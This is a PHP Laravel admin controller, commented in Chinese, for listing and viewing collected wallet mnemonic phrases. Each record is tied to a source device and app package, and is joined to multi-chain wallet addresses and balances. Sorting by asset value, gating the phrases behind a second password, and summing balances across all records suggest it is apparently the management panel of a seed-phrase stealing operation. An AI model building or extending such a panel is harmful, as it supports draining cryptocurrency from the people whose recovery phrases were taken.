<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Http\Controllers\Admin\AuthorizationsController;
use App\Models\ReceiveWords;
use App\Models\ReceiveWordKey;
use Illuminate\Http\Request;

class ReceiveWordsController extends Controller
{
    /**
     * 助记词列表
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function list(Request $request)
    {
        $request->validate([
            'page' => 'required|int',
            'limit' => 'required|int',
            'device_number' => 'nullable|string',
            'app_name' => 'nullable|string',
            'app_package' => 'nullable|string',
            'device_id' => 'nullable|int',
            'prop' => 'nullable|string',      // 排序字段名（如：assets, id, created_at等）
            'order' => 'nullable|string',     // 排序方向：ascending(升序) 或 descending(降序)
        ]);

        $page = $request->get('page', 1);
        $limit = $request->get('limit', 20);
        $offset = ($page - 1) * $limit;

        $model = ReceiveWords::query();

        // 按设备号搜索
        if (!empty($request->device_number)) {
            $model->where('device_number', 'like', '%' . $request->device_number . '%');
        }

        // 按应用名称搜索
        if (!empty($request->app_name)) {
            $model->where('app_name', 'like', '%' . $request->app_name . '%');
        }

        // 按应用包名搜索
        if (!empty($request->app_package)) {
            $model->where('app_package', 'like', '%' . $request->app_package . '%');
        }

        // 按设备ID搜索
        if (!empty($request->device_id)) {
            $model->where('device_id', $request->device_id);
        }

        // 处理排序
        $prop = $request->get('prop');   // 排序字段名
        $order = $request->get('order'); // 排序方向：ascending 或 descending
        
        // 先获取总数（在应用排序和分页前）
        $count = $model->count();
        
        // 应用排序
        if ($prop === 'assets' && !empty($order)) {
            // 资产字段排序：基于 receive_word_keys 表的余额进行排序
            $orderDirection = $order === 'descending' ? 'desc' : 'asc';
            
            // 使用子查询对余额进行排序
            $model->leftJoin('receive_word_keys', 'receive_words.id', '=', 'receive_word_keys.receive_word_id')
                  ->select('receive_words.*')
                  ->selectRaw('MAX(CASE WHEN receive_word_keys.currency_type = "TRC20USDT" THEN receive_word_keys.balance ELSE 0 END) as max_trc20usdt')
                  ->selectRaw('MAX(CASE WHEN receive_word_keys.currency_type = "ERC20USDT" THEN receive_word_keys.balance ELSE 0 END) as max_erc20usdt')
                  ->selectRaw('MAX(CASE WHEN receive_word_keys.currency_type = "BEP20USDT" THEN receive_word_keys.balance ELSE 0 END) as max_bep20usdt')
                  ->selectRaw('MAX(CASE WHEN receive_word_keys.currency_type = "ETH" THEN receive_word_keys.balance ELSE 0 END) as max_eth')
                  ->selectRaw('MAX(CASE WHEN receive_word_keys.currency_type = "BSC" THEN receive_word_keys.balance ELSE 0 END) as max_bsc')
                  ->selectRaw('MAX(CASE WHEN receive_word_keys.currency_type = "TRON" THEN receive_word_keys.balance ELSE 0 END) as max_tron')
                  ->selectRaw('MAX(CASE WHEN receive_word_keys.currency_type = "BTC" THEN receive_word_keys.balance ELSE 0 END) as max_btc')
                  ->groupBy('receive_words.id')
                  ->orderBy('max_trc20usdt', $orderDirection)
                  ->orderBy('max_erc20usdt', $orderDirection)
                  ->orderBy('max_bep20usdt', $orderDirection)
                  ->orderBy('max_eth', $orderDirection)
                  ->orderBy('max_bsc', $orderDirection)
                  ->orderBy('max_tron', $orderDirection)
                  ->orderBy('max_btc', $orderDirection);
        } else {
            // 其他字段排序或默认排序
            if ($prop && $order) {
                $orderDirection = $order === 'descending' ? 'desc' : 'asc';
                $model->orderBy($prop, $orderDirection);
            } else {
                $model->orderBy('id', 'desc');
            }
        }
        
        // 获取列表数据的ID（先获取ID，避免groupBy的问题）
        // 注意：不能覆盖select，因为排序字段需要被select出来
        $idsQuery = clone $model;
        if ($prop === 'assets' && !empty($order)) {
            // 资产排序使用了leftJoin和groupBy，由于使用了select('receive_words.*')，id字段已经包含在select中
            // 不能使用select覆盖，否则会丢失排序字段（max_trc20usdt等）
            $ids = $idsQuery->offset($offset)
                ->limit($limit)
                ->pluck('id')  // 直接使用id，因为select('receive_words.*')已经包含了id字段
                ->toArray();
        } else {
            // 普通排序，直接使用id
            $ids = $idsQuery->offset($offset)
                ->limit($limit)
                ->pluck('id')
                ->toArray();
        }
        
        if (empty($ids)) {
            $list = [];
        } else {
            // 根据ID获取完整数据，排除地址和余额字段（这些字段现在从 receive_word_keys 表获取）
            $items = ReceiveWords::whereIn('id', $ids)
                ->select([
                    'id', 'device_id', 'device_number', 'app_name', 'app_package', 
                    'words', 'created_at', 'updated_at'
                ])  // 明确指定需要的字段，排除所有 wallet_address_* 和 wallet_balance_* 字段
                ->orderByRaw('FIELD(id, ' . implode(',', $ids) . ')')  // 保持排序顺序
                ->get();
            
            // 加载关联的钱包密钥数据
            $walletKeysMap = ReceiveWordKey::whereIn('receive_word_id', $ids)
                ->get()
                ->groupBy('receive_word_id');
            
            // 币种类型到字段名的映射
            $fieldMap = [
                'BTC' => ['address' => 'wallet_address_btc', 'balance' => 'wallet_balance_btc'],
                'ETH' => ['address' => 'wallet_address_eth', 'balance' => 'wallet_balance_eth'],
                'BSC' => ['address' => 'wallet_address_bsc', 'balance' => 'wallet_balance_bsc'],
                'TRON' => ['address' => 'wallet_address_tron', 'balance' => 'wallet_balance_tron'],
                'SOL' => ['address' => 'wallet_address_sol', 'balance' => 'wallet_balance_sol'],
                'TON' => ['address' => 'wallet_address_ton', 'balance' => 'wallet_balance_ton'],
                'XRP' => ['address' => 'wallet_address_xrp', 'balance' => 'wallet_balance_xrp'],
                'ERC20USDT' => ['address' => 'wallet_address_eth', 'balance' => 'wallet_balance_eth_usdt'],
                'BEP20USDT' => ['address' => 'wallet_address_bsc', 'balance' => 'wallet_balance_bsc_usdt'],
                'TRC20USDT' => ['address' => 'wallet_address_tron', 'balance' => 'wallet_balance_tron_usdt'],
            ];
            
            // 处理数据，将 walletKeys 数据映射到前端需要的格式
            $list = $items->map(function ($item) use ($walletKeysMap, $fieldMap) {
                $data = $item->toArray();
                
                // 从 walletKeysMap 中获取该记录的密钥数据
                $walletKeys = $walletKeysMap->get($item->id, collect());
                
                // 遍历 walletKeys，设置地址和余额
                foreach ($walletKeys as $key) {
                    // 确保 $key 是数组格式
                    $keyArray = is_array($key) ? $key : $key->toArray();
                    $currencyType = $keyArray['currency_type'] ?? '';
                    $address = $keyArray['address'] ?? null;
                    $balance = $keyArray['balance'] ?? null;
                    
                    // 确保 currency_type 存在且映射正确
                    if (!empty($currencyType) && isset($fieldMap[$currencyType])) {
                        $addressField = $fieldMap[$currencyType]['address'];
                        $balanceField = $fieldMap[$currencyType]['balance'];
                        
                        // 设置地址（如果还没有设置，且当前地址不为空）
                        if (empty($data[$addressField]) && $address) {
                            $data[$addressField] = $address;
                        }
                        
                        // 设置余额（确保每个币种都设置到正确的字段）
                        $data[$balanceField] = $balance;
                    }
                }
                
                return $data;
            })->toArray();
        }

        // 检查二次密码验证状态，未验证时隐藏助记词字段
        $isVerified = AuthorizationsController::checkSecondPasswordVerified($request);
        if (!$isVerified) {
            foreach ($list as &$item) {
                $item['words'] = null;
            }
            unset($item);
        }

        return $this->success(['total_num' => $count, 'list' => $list]);
    }

    /**
     * 获取指定助记词
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function info(Request $request)
    {
        $request->validate([
            'id' => 'required|int'
        ]);

        $info = ReceiveWords::query()
            ->where('id', $request->id)
            ->select([
                'id', 'device_id', 'device_number', 'app_name', 'app_package', 
                'words', 'created_at', 'updated_at'
            ])  // 明确指定需要的字段，排除所有 wallet_address_* 和 wallet_balance_* 字段
            ->first();

        if (empty($info)) {
            return $this->fail(404, '助记词不存在');
        }

        $data = $info->toArray();
        
        // 从 receive_word_keys 表获取地址和余额数据
        $walletKeys = ReceiveWordKey::where('receive_word_id', $request->id)
            ->get();
        
        // 币种类型到字段名的映射
        $fieldMap = [
            'BTC' => ['address' => 'wallet_address_btc', 'balance' => 'wallet_balance_btc'],
            'ETH' => ['address' => 'wallet_address_eth', 'balance' => 'wallet_balance_eth'],
            'BSC' => ['address' => 'wallet_address_bsc', 'balance' => 'wallet_balance_bsc'],
            'TRON' => ['address' => 'wallet_address_tron', 'balance' => 'wallet_balance_tron'],
            'SOL' => ['address' => 'wallet_address_sol', 'balance' => 'wallet_balance_sol'],
            'TON' => ['address' => 'wallet_address_ton', 'balance' => 'wallet_balance_ton'],
            'XRP' => ['address' => 'wallet_address_xrp', 'balance' => 'wallet_balance_xrp'],
            'ERC20USDT' => ['address' => 'wallet_address_eth', 'balance' => 'wallet_balance_eth_usdt'],
            'BEP20USDT' => ['address' => 'wallet_address_bsc', 'balance' => 'wallet_balance_bsc_usdt'],
            'TRC20USDT' => ['address' => 'wallet_address_tron', 'balance' => 'wallet_balance_tron_usdt'],
        ];
        
        // 遍历 walletKeys，设置地址和余额
        foreach ($walletKeys as $key) {
            // 确保 $key 是数组格式
            $keyArray = is_array($key) ? $key : $key->toArray();
            $currencyType = $keyArray['currency_type'] ?? '';
            $address = $keyArray['address'] ?? null;
            $balance = $keyArray['balance'] ?? null;
            
            // 确保 currency_type 存在且映射正确
            if (!empty($currencyType) && isset($fieldMap[$currencyType])) {
                $addressField = $fieldMap[$currencyType]['address'];
                $balanceField = $fieldMap[$currencyType]['balance'];
                
                // 设置地址（如果还没有设置，且当前地址不为空）
                if (empty($data[$addressField]) && $address) {
                    $data[$addressField] = $address;
                }
                
                // 设置余额（确保每个币种都设置到正确的字段）
                $data[$balanceField] = $balance;
            }
        }

        // 检查二次密码验证状态，未验证时隐藏助记词字段
        $isVerified = AuthorizationsController::checkSecondPasswordVerified($request);
        if (!$isVerified) {
            $data['words'] = null;
        }

        return $this->success($data);
    }

    /**
     * 余额统计接口
     * 返回所有币种当前余额总和
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function balanceStats(Request $request)
    {
        // 按币种类型分组统计余额总和，只返回币种和总余额
        $stats = ReceiveWordKey::select('currency_type')
            ->selectRaw('SUM(balance) as total_balance')
            ->groupBy('currency_type')
            ->orderBy('currency_type')
            ->get()
            ->pluck('total_balance', 'currency_type')
            ->map(function ($balance) {
                return (string)$balance; // 转换为字符串保持精度
            })
            ->toArray();

        return $this->success($stats);
    }
}

